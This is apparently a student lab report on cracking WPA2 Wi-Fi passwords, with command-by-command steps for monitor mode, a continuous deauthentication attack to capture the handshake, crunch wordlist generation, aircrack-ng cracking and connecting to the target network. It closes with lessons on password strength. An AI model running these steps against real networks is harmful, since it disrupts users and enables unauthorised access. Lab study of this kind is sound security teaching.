# Wireless Network Compromise Lab

## Introduction

This project report focuses on understanding tools used for compromising wireless networks, specifically airmon-ng, aircrack-ng, and crunch. The objective is to analyze and practice capturing WPA2 handshakes, generating password lists, and performing brute-force attacks to crack Wi-Fi passwords.

## Objectives

Learn about airmon-ng, aircrack-ng, and crunch.

Install these tools on a physical or virtual machine.

Capture a WPA2 handshake from a target wireless network.

Generate a password list using crunch.

Crack the Wi-Fi password using aircrack-ng.

Successfully connect to the compromised network.

## Task Description
### 1. Capturing WPA2 Handshake

* Enable monitor mode using: sudo airmon-ng start <interface>.</br>
![Enable monitor mode using](images/1.PNG) </br>
* Kill interfering processes using: sudo airmon-ng check kill.</br>
![Kill interfering processes](images/2.PNG) </br>
* Scan for available Wi-Fi networks: sudo airodump-ng <monitor_interface>.</br>
![Scan wi-fi networks](images/4.PNG) </br>
* Filter to a specific network: sudo airodump-ng -d <BSSID> <monitor_interface>.</br>
![Filter to a specific network](images/5.PNG) </br>
* Capture handshake by forcing client deauthentication: sudo aireplay-ng --deauth 0 -a <BSSID> <monitor_interface>.</br>
![client deauthentication](images/6.PNG) </br>

### 2. Creating a Custom Password List

Generate a list of 4-digit PINs: crunch 4 4 0123456789 -o crunch-list.txt.</br>
![Generate a list of 4-digit PINs](images/8.PNG) </br>
Define patterns using placeholders (@, %, ^): crunch 8 8 -t 'test%%%^' -o crunch-list-2.txt.</br>
![Define patterns using placeholders](images/9.PNG) </br>
### 3. Cracking the WPA2 Password

Use aircrack-ng with the captured handshake and password list:</br>
aircrack-ng <capture_file> -w <wordlist_file></br>
![Use aircrack-ng](images/10.PNG) </br>
Identify the correct password and connect to the Wi-Fi network.</br>
![Identify the correct password and connect to the Wi-Fi network](images/11.PNG) </br>
## Key Observations

Monitor Mode is essential for packet capturing.</br>

Deauthentication Attacks force clients to reconnect, capturing the handshake.</br>

Password Strength significantly impacts cracking success; strong passwords resist brute-force attempts.</br>

Predefined Wordlists (like rockyou.txt) improve attack efficiency.</br>

## Conclusion

This project demonstrated techniques for capturing and cracking WPA2 Wi-Fi passwords using airmon-ng, aircrack-ng, and crunch. The experiment provided insight into wireless network security vulnerabilities and the importance of strong password policies.
